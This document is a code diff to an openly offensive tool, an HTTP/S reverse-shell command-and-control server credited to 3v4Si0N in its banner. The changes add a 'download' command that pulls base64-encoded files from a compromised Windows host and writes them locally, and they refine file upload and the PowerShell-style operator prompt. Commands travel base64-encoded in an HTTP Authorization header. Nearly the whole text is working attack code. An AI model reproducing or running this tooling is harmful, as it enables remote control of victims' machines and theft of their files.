@@ -34,7 +34,14 @@ class myHandler(BaseHTTPRequestHandler):
 
         result = self.parseResult()
         pwd = self.getPwd(result)
-        self.printResult(result)
+
+        if (self.isDownloadFunctCalled(result)):
+            filename, result, output = self.parseDownload(result)
+            functions = Functions()
+            functions.download(filename, result, output)
+        else:
+            self.printResult(result)
+
         command = self.newCommand(pwd)
         self.sendCommand(command, html)
         return
@@ -48,10 +55,21 @@ class myHandler(BaseHTTPRequestHandler):
             result = urllib.parse.unquote(result)
             result = (base64.b64decode(result)).decode('utf-8')
         except:
-            #print ("result without b64 --> {}".format(result))
             pass
+
         result=result.split('_n1w_')
         return result
+
+    def parseDownload(self, result):
+        downloaded_file_path = ""
+        try:
+            output = result[2]
+            downloaded_file_path = result[1]
+            result=result[0].split("D0wnL04d")[1]
+        except IndexError:
+            pass
+
+        return downloaded_file_path, result, output
 
     def getPwd(self, result):
         if result[0] == "":
@@ -62,22 +80,44 @@ class myHandler(BaseHTTPRequestHandler):
 
     def printResult(self, result):
         for string in result:
-            print(colored(string, 'blue'))
+            print(colored(string, 'white'))
+
+    def isDownloadFunctCalled(self, result):
+        iscalled = False
+        try:
+            if ("D0wnL04d" in result[0]):
+                iscalled = True
+        except IndexError:
+            pass
+        return iscalled
 
     def newCommand(self, pwd):
         if (pwd == "start"):
             input(colored("[!] New Connection, please press ENTER!",'red'))
             command = "pwd"
         else:
-            command = input("PS {}> ".format(pwd)) + " ;pwd"
+            command = input(colored("PS {}> ".format(pwd), "blue")) + " ;pwd"
         return command
 
-    def sendCommand(self, command, html):
+    def sendCommand(self, command, html, content=""):
         if (command.split(" ")[0] == "upload"):
             functions = Functions()
-            filename = command.split(" ")[1]
-            content = functions.upload(filename)
-            html = content.decode('utf-8')
+            try:
+                filename = command.split(" ")[1]
+                content = functions.upload(filename)
+                html = content.decode('utf-8')
+            except AttributeError:
+                print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
+                command = "pwd"
+
+        elif (command.split(" ")[0] == "download"):
+            try:
+                srcFile = command.split(" ")[1]
+                dstFile = command.split(" ")[2]
+            except IndexError:
+                print (colored("\r\n[!] Source and/or destination file not found!", "red"))
+                print (colored("\t- Usage: download C:\\src\\path\\file /dst/path/file\n", "red"))
+                command = "pwd"
 
         CMD = base64.b64encode(command.encode())
         self.send_header('Authorization',CMD.decode('utf-8'))
@@ -92,15 +132,24 @@ class Functions():
                 content = file.read()
                 return base64.b64encode(content)
         except FileNotFoundError:
-            print (colored("\r\n[!] File not found!\n", "red"))
+            print (colored("\r\n[!] Source file not found!", "red"))
+
+    def download(self, filename, content, output):
+        try:
+            with open(filename, mode='wb') as file: # b is importante -> binary
+                content = base64.b64decode(content)
+                file.write(content)
+                print(colored(output, "green"))
+        except:
+            print ("Except download")
 
 def main():
 
     banner = """
-██╗  ██╗████████╗████████╗██████╗   ██╗███████╗    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗     
-██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗ ██╔╝██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║     
-███████║   ██║      ██║   ██████╔╝██╔╝ ███████╗    ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║     
-██╔══██║   ██║      ██║   ██╔═══╝██╔╝  ╚════██║    ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║     
+██╗  ██╗████████╗████████╗██████╗   ██╗███████╗    ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗
+██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗ ██╔╝██╔════╝    ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║
+███████║   ██║      ██║   ██████╔╝██╔╝ ███████╗    ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║
+██╔══██║   ██║      ██║   ██╔═══╝██╔╝  ╚════██║    ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║
 ██║  ██║   ██║      ██║   ██║   ██╔╝   ███████║    ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗
 ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝   ╚═╝    ╚══════╝    ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
                                                                                                          By: 3v4Si0N
